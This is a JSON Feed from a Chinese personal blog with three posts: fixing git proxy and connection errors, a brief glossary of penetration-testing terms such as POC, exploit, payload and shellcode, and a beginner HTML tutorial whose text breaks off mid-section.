{
    "version": "https://jsonfeed.org/version/1",
    "title": "P1kap1",
    "subtitle": "东隅已逝，桑榆非晚",
    "icon": "https://p1kap1.github.io/images/favicon.ico",
    "description": "明镜止水之心",
    "home_page_url": "https://p1kap1.github.io",
    "items": [
        {
            "id": "https://p1kap1.github.io/knowledge/%E8%A7%A3%E5%86%B3git%E6%8F%90%E4%BA%A4%E6%88%96%E5%85%8B%E9%9A%86%E6%8A%A5%E9%94%99/",
            "url": "https://p1kap1.github.io/knowledge/%E8%A7%A3%E5%86%B3git%E6%8F%90%E4%BA%A4%E6%88%96%E5%85%8B%E9%9A%86%E6%8A%A5%E9%94%99/",
            "title": "解决git提交或克隆报错",
            "date_published": "2023-12-26T16:00:00.000Z",
            "content_html": "<p>在使用 hexo 部署博客常常遇到以下错误：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fatal: unable to access <span class=\"token string\">'https://github.com/xxx/autowrite.git/'</span><span class=\"token builtin class-name\">:</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>OpenSSL SSL_read: Connection was reset, errno <span class=\"token number\">10054</span></pre></td></tr></table></figure><p>或者</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fatal: unable to access <span class=\"token string\">'https://github.com/xxx/autowrite.git/'</span><span class=\"token builtin class-name\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Failed to connect to github.com port <span class=\"token number\">443</span>: Timed out</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Empty reply from server</pre></td></tr></table></figure><p>因为 git 在拉取或者提交项目时，中间会有 git 的 http 和 https 代理，但是我们本地环境本身就有 SSL 协议了，所以取消 git 的 https 代理即可，不行再取消 http 的代理。</p>\n<p>后续<br />\n原因还有一个，当前代理网速过慢，所以偶尔会成功，偶尔失败。</p>\n<p>可以这样解决：</p>\n<p>在项目文件夹的命令行窗口执行下面代码，然后再 git commit 或 git clone<br />\n 取消 git 本身的 https 代理，使用自己本机的代理，如果没有的话，其实默认还是用 git 的</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>//取消http代理</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> <span class=\"token parameter variable\">--unset</span> http.proxy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>//取消https代理 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">git</span> config <span class=\"token parameter variable\">--global</span> <span class=\"token parameter variable\">--unset</span> https.proxy</pre></td></tr></table></figure><p>但是这样有时候却不能奏效，这种方法时好时坏，有可能是由于本地没有代理，导致取消代理不起作用，可以通过修改本地 hosts 文件，来直接连接对你自己来说 github.com 最新的 IP 地址。</p>\n<p>当然这种方法依旧不稳定，探索发现</p>\n<p>根据之前经验多次尝试后（比如直接用查询到的 IP 地址登录网站），我发现我登不上去还是 github 自身的问题。</p>\n<blockquote>\n<p>1. 当我可以用 IP 地址直接登录网站时，将 IP 地址映射添加进 hosts 文件才是有效的。<br />\n2. 当 github 可以直接登录不需要映射，将 hosts 文件中有关内容注释掉才是合适的。<br />\n3. 当上述都登不上时，改 hosts 无效。</p>\n</blockquote>\n<p>所以重新思考情况，我发现开代理的情况下能登上网页版，但不能使用命令行，所以就得寻找怎么在开代理的情况下使用命令行。</p>\n<p>即：给 git 命令开代理。</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git config --global http.proxy <span class=\"token property\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:7890</span></pre></td></tr></table></figure><p>这里的 7890 为你代理软件的端口，由于我的 clash 端口为 7890，所以设为这个，具体取决于你那边情况。</p>\n",
            "tags": [
                "杂谈小记",
                "linux"
            ]
        },
        {
            "id": "https://p1kap1.github.io/knowledge/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2023.12.1/",
            "url": "https://p1kap1.github.io/knowledge/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2023.12.1/",
            "title": "",
            "date_published": "2023-12-01T12:06:22.511Z",
            "content_html": "<h2 id=\"渗透测试常用专业术语\"><a class=\"anchor\" href=\"#渗透测试常用专业术语\">#</a> 渗透测试常用专业术语</h2>\n<h3 id=\"1-poc-exp-payload与shellcode\"><a class=\"anchor\" href=\"#1-poc-exp-payload与shellcode\">#</a> <strong>1. POC、EXP、Payload 与 Shellcode</strong></h3>\n<blockquote>\n<p>POC：全称 ' Proof of Concept '，中文 ' 概念验证 ' ，常指一段漏洞证明的代码。</p>\n<p>EXP：全称 ' Exploit '，中文 ' 利用 '，指利用系统漏洞进行攻击的动作。</p>\n<p>Payload：中文 ' 有效载荷 '，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>\n<p>Shellcode：简单翻译 ' shell 代码 '，是 Payload 的一种，由于其建立正向 / 反向 shell 而得名。</p>\n</blockquote>\n<h3 id=\"2-几点注意\"><a class=\"anchor\" href=\"#2-几点注意\">#</a> <strong>2. 几点注意</strong></h3>\n<blockquote>\n<p>POC 是用来证明漏洞存在的，EXP 是用来利用漏洞的，两者通常不是一类，或者说，PoC 通常是无害的，Exp 通常是有害的，有了 POC，才有 EXP。</p>\n<p>Payload 有很多种，它可以是 Shellcode，也可以直接是一段系统命令。同一个 Payload 可以用于多个漏洞，但每个漏洞都有其自己的 EXP，也就是说不存在通用的 EXP。</p>\n<p>Shellcode 也有很多种，包括正向的，反向的，甚至 meterpreter。</p>\n<p>Shellcode 与 Shellshcok 不是一个，Shellshock 特指 14 年发现的 Shellshock 漏洞。</p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "https://p1kap1.github.io/knowledge/web%E5%BC%80%E5%8F%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/NO.1/",
            "url": "https://p1kap1.github.io/knowledge/web%E5%BC%80%E5%8F%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/NO.1/",
            "title": "NO.1-html、css篇",
            "date_published": "2023-11-12T16:00:00.000Z",
            "content_html": "<h2 id=\"html\"><a class=\"anchor\" href=\"#html\">#</a> HTML</h2>\n<h3 id=\"基础\"><a class=\"anchor\" href=\"#基础\">#</a> 基础</h3>\n<p>HTML 全称 HyperText Mark Language，也就是超文本标记语言，它不是一种编程语言，而是一种标记语言。</p>\n<h4 id=\"元素详解\"><a class=\"anchor\" href=\"#元素详解\">#</a> 元素详解</h4>\n<p>标记语言是一套标记标签，而 html 使用标记标签来描述网页，通常是成对出现且由尖括号包围的关键词，比如 &lt;html&gt;&lt;/html&gt;，而标签里面可以嵌套内容，开始标签、结束标签与内容相结合，便是一个完整的元素。</p>\n<p>以下便是一个元素的示例：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>My cat is very grumpy<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>元素也可以有属性（Attribute）：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>editor-note<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>My cat is very grumpy<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>属性包含了关于元素的一些额外信息，这些信息本身不应显现在内容中。本例中， <code>class</code>  是属性名称， <code>editor-note</code>  是属性的值。 <code>class</code>  属性可为元素提供一个标识名称，以便进一步为元素指定样式或进行其他操作时使用。</p>\n<p>属性应该包含：</p>\n<ol>\n<li>在属性与元素名称（或上一个属性，如果有超过一个属性的话）之间的空格符。</li>\n<li>属性的名称，并接上一个等号。</li>\n<li>由引号所包围的属性值。</li>\n</ol>\n<p><strong>备注：</strong> 不包含 ASCII 空格（以及  <code>&quot;</code>   <code>'</code>  ```  <code>=</code>   <code>&lt;</code>   <code>&gt;</code> ）的简单属性值可以不使用引号，但是建议将所有属性值用引号括起来，这样的代码一致性更佳，更易于阅读。</p>\n<p>属性参考：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">属性</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">class</td>\n<td style=\"text-align:left\">为 html 元素定义一个或多个类名（classname）(类名从样式文件引入)</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">id</td>\n<td style=\"text-align:left\">定义元素的唯一 id</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">style</td>\n<td style=\"text-align:left\">规定元素的行内样式（inline style）</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">title</td>\n<td style=\"text-align:left\">描述了元素的额外信息 (作为工具条使用)</td>\n</tr>\n</tbody>\n</table>\n<p>更多标准属性说明： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS90YWdzL3JlZi1zdGFuZGFyZGF0dHJpYnV0ZXMuaHRtbA==\">HTML 标准属性参考手册</span>.</p>\n<h4 id=\"嵌套元素\"><a class=\"anchor\" href=\"#嵌套元素\">#</a> 嵌套元素</h4>\n<p>也可以将一个元素置于其他元素之中 —— 称作嵌套。要表明猫咪非常暴躁，可以将 “very” 用 &lt;strong&gt;&lt;/strong&gt; 元素包围，爆字将突出显示：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>My cat is <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>strong</span><span class=\"token punctuation\">></span></span>very<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>strong</span><span class=\"token punctuation\">></span></span> grumpy.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>必须保证元素嵌套次序正确：本例首先使用 &lt;p&gt; 标签，然后是 &lt; strong &gt; 标签，因此要先结束 &lt;strong &gt; 标签，最后再结束 &lt;/strong &gt; 标签。这样是不对的：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>My cat is <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>strong</span><span class=\"token punctuation\">></span></span>very grumpy.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>strong</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>元素必须正确地开始和结束，才能清楚地显示出正确的嵌套层次。否则浏览器就得自己猜测，虽然它会竭尽全力，但很大程度不会给你期望的结果。所以一定要避免！</p>\n<p>说到这，就可以注意到，HTML 文档是由三个 HTML 元素嵌套：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>这是第一个段落。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h4 id=\"空元素\"><a class=\"anchor\" href=\"#空元素\">#</a> 空元素</h4>\n<p>没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。</p>\n<p>&lt;br&gt; 就是没有关闭标签的空元素（&lt;br&gt; 标签定义换行）。</p>\n<p>在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。</p>\n<p>在开始标签中添加斜杠，比如 &lt;br /&gt;，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式。</p>\n<p>即使 &lt;br&gt; 在所有浏览器中都是有效的，但使用 &lt;br /&gt; 其实是更长远的保障。</p>\n<p>&lt;img&gt; 元素：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/firefox-icon.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>My test image<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr></table></figure><p>本元素包含两个属性，但是并没有  <code>&lt;/img&gt;</code>  结束标签，元素里也没有内容。这是因为图像元素不需要通过内容来产生效果，它的作用是向其所在的位置嵌入一个图像。</p>\n<h4 id=\"html-文档详解\"><a class=\"anchor\" href=\"#html-文档详解\">#</a> HTML 文档详解</h4>\n<p>以上介绍了一些基本的 HTML 元素，但孤木不成林。现在来看看单个元素如何彼此协同构成一个完整的 HTML 页面，  <code>index.html</code>  示例：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">doctype</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en-US<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>My test page<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/firefox-icon.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>My test image<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>这里有：</p>\n<ul>\n<li><code>&lt;!DOCTYPE html&gt;</code> ——<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9HbG9zc2FyeS9Eb2N0eXBl\"> 文档类型</span>。这是必不可少的开头。混沌初分，HTML 尚在襁褓（大约是 1991/92 年）之时，这个元素用来关联 HTML 编写规范，以供自动查错等功能所用。而在当今，它作用有限，可以说仅用于保证文档正常读取。现在知道这些就足够了。</li>\n<li><code>&lt;html&gt;&lt;/html&gt;</code> ——&lt;html&gt; 元素。该元素包含整个页面的所有内容，有时候也称作根元素。里面也包含了  <code>lang</code>  属性，写明了页面的主要语种。</li>\n<li><code>&lt;head&gt;&lt;/head&gt;</code> ——&lt;head&gt; 元素。所有那些你加到页面中，且<em>不</em>向看客展示的页面成员，都以这个元素为容器。其中包含诸如提供给搜索引擎的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9HbG9zc2FyeS9LZXl3b3Jk\">关键字</span>和页面描述、用作风格化页面的 CSS、字符集声明等等。</li>\n<li><code>&lt;meta charset=&quot;utf-8&quot;&gt;</code> —— 该元素指明你的文档使用 UTF-8 字符编码，UTF-8 包括世界绝大多数书写语言的字符。它基本上可以处理任何文本内容。以它为编码还可以避免以后出现某些问题，没有理由再选用其他编码。</li>\n<li><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt;</code> ——<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvQ1NTL1ZpZXdwb3J0X2NvbmNlcHRzIyVFNyVBNyVCQiVFNSU4QSVBOCVFOCVBRSVCRSVFNSVBNCU4NyVFNyU5QSU4NCVFOCVBNyU4NiVFNSU4RiVBMw==\"> 视口元素</span>可以确保页面以视口宽度进行渲染，避免移动端浏览器上因页面过宽导致缩放。</li>\n<li><code>&lt;title&gt;&lt;/title&gt;</code> ——&lt;title&gt; 元素。该元素设置页面的标题，显示在浏览器标签页上，也作为收藏网页的描述文字。</li>\n<li><code>&lt;body&gt;&lt;/body&gt;</code> ——&lt;body&gt; 元素。该元素包含期望让用户在访问页面时看到的<em>全部</em>内容，包括文本、图像、视频、游戏、可播放的音轨或其他内容。</li>\n</ul>\n<h4 id=\"图像\"><a class=\"anchor\" href=\"#图像\">#</a> 图像</h4>\n<p>重温一下 &lt;img&gt; 元素：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/firefox-icon.png<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>My test image<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr></table></figure><p>像之前所讲，该元素通过包含图像文件路径的地址属性  <code>src</code> ，可在所在位置嵌入图像。</p>\n<p>该元素还包括一个替换文字属性  <code>alt</code> ，是图像的描述内容，用于当图像不能被用户看见时显示，不可见的原因可能是：</p>\n<ol>\n<li>用户有视觉障碍。视障用户可以使用屏幕阅读器来朗读  <code>alt</code>  属性的内容。</li>\n<li>有些错误使图像无法显示。可以试着故意将  <code>src</code>  属性里的路径改错。保存并刷新页面就可以在图像位置看到：</li>\n</ol>\n<p><img data-src=\"https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web/HTML_basics/alt-text-example.png\" alt=\"图片内容为文字“测试图片”\" /></p>\n<p><code>alt</code>  属性的关键字即 “描述文本”。 <code>alt</code>  文本应向用户完整地传递图像要表达的意思。用 &quot;测试图片&quot; 来描述 Firefox 标志并不合适，修改成 &quot;Firefox 标志：一只盘旋在地球上的火狐&quot; 就好多了。</p>\n<p>可以试着为图像编写一些更好的  <code>alt</code>  文本。</p>\n<h4 id=\"标记文本\"><a class=\"anchor\" href=\"#标记文本\">#</a> 标记文本</h4>\n<p>本段包含了一些最常用的文本标记 HTML 元素。</p>\n<h5 id=\"标题heading\"><a class=\"anchor\" href=\"#标题heading\">#</a> 标题（Heading)</h5>\n<p>标题元素可用于指定内容的标题和子标题。就像一本书的书名、每章的大标题、小标题，等。HTML 文档也是一样。HTML 包括六个级别的标题，&lt;h1&gt;-&lt;h6&gt; ，一般最多用到 3-4 级标题。</p>\n<pre><code>&lt;h1&gt;主标题&lt;/h1&gt;\n&lt;h2&gt;顶层标题&lt;/h2&gt;\n&lt;h3&gt;子标题&lt;/h3&gt;\n&lt;h4&gt;次子标题&lt;/h4&gt;\n</code></pre>\n<p>可以尝试在 &lt;img&gt; 元素上面添加一个合适的标题。</p>\n<p>备注：你可以看到第一级标题是有隐式的主题样式。不要使用标题元素来加大、加粗字体，因为标题对于 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9MZWFybi9BY2Nlc3NpYmlsaXR5\">无障碍访问</span> 和 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9MZWFybi9IVE1ML0ludHJvZHVjdGlvbl90b19IVE1ML0hUTUxfdGV4dF9mdW5kYW1lbnRhbHMjJUU0JUI4JUJBJUU0JUJCJTgwJUU0JUI5JTg4JUU2JTg4JTkxJUU0JUJCJUFDJUU5JTlDJTgwJUU4JUE2JTgxJUU3JUJCJTkzJUU2JTlFJTg0JUU1JThDJTk2JUVGJUJDJTlG\">搜索引擎优化</span> 等问题非常有意义。要保持页面结构清晰，标题整洁，不要发生标题级别跳跃。</p>\n<h5 id=\"html-水平线\"><a class=\"anchor\" href=\"#html-水平线\">#</a> HTML 水平线</h5>\n<p>&lt;hr&gt; 标签在 HTML 页面中创建水平线。</p>\n<p>hr 元素可用于分隔内容。</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>这是一个段落。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>这是一个段落。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>hr</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>这是一个段落。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h5 id=\"html-注释\"><a class=\"anchor\" href=\"#html-注释\">#</a> HTML 注释</h5>\n<p>可以将注释插入 HTML 代码中，这样可以提高其可读性，使代码更易被人理解。浏览器会忽略注释，也不会显示它们。</p>\n<p>注释写法如下:</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- 这是一个注释 --></span></pre></td></tr></table></figure><p>注释：开始括号之后（左边的括号）需要紧跟一个叹号 <strong>!</strong> (英文标点符号)，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。</p>\n<h5 id=\"段落paragraph\"><a class=\"anchor\" href=\"#段落paragraph\">#</a> 段落（Paragraph）</h5>\n<p>如上文所讲，&lt;p&gt; 元素是用来指定段落的。通常用于指定常规的文本内容：</p>\n<pre><code>&lt;p&gt;这是一个段落&lt;/p&gt;\n</code></pre>\n<p>试着添加一些文本（在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9MZWFybi9HZXR0aW5nX3N0YXJ0ZWRfd2l0aF90aGVfd2ViL1doYXRfd2lsbF95b3VyX3dlYnNpdGVfbG9va19saWtl\">设计网站的外观</span> 小节）到一个或几个段落中，并把它们放在你的 &lt;p&gt; 元素下方。</p>\n<h5 id=\"html-折行\"><a class=\"anchor\" href=\"#html-折行\">#</a> HTML 折行</h5>\n<p>如果您希望在不产生一个新段落的情况下进行换行（新行），请使用 &lt;br&gt; 标签：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p>这个<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>段落<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>演示了分行的效果<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h5 id=\"html-输出-使用提醒\"><a class=\"anchor\" href=\"#html-输出-使用提醒\">#</a> HTML 输出 - 使用提醒</h5>\n<p>我们无法确定 HTML 被显示的确切效果。屏幕的大小，以及对窗口的调整都可能导致不同的结果。</p>\n<p>对于 HTML，您无法通过在 HTML 代码中添加额外的空格或换行来改变输出的效果。</p>\n<p>当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。需要注意的是，HTML 代码中的所有连续的空行（换行）也被显示为一个空格</p>\n<h3 id=\"列表list\"><a class=\"anchor\" href=\"#列表list\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9MZWFybi9HZXR0aW5nX3N0YXJ0ZWRfd2l0aF90aGVfd2ViL0hUTUxfYmFzaWNzIyVFNSU4OCU5NyVFOCVBMSVBOCVFRiVCQyU4OGxpc3QlRUYlQkMlODk=\">列表（List）</span></h3>\n<p>Web 上的许多内容都是列表，HTML 有一些特别的列表元素。标记列表通常包括至少两个元素。最常用的列表类型为：</p>\n<ol>\n<li><strong>无序列表</strong>（Unordered List）中项目的顺序并不重要，就像购物列表。用一个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRNTC9FbGVtZW50L3Vs\">``</span> 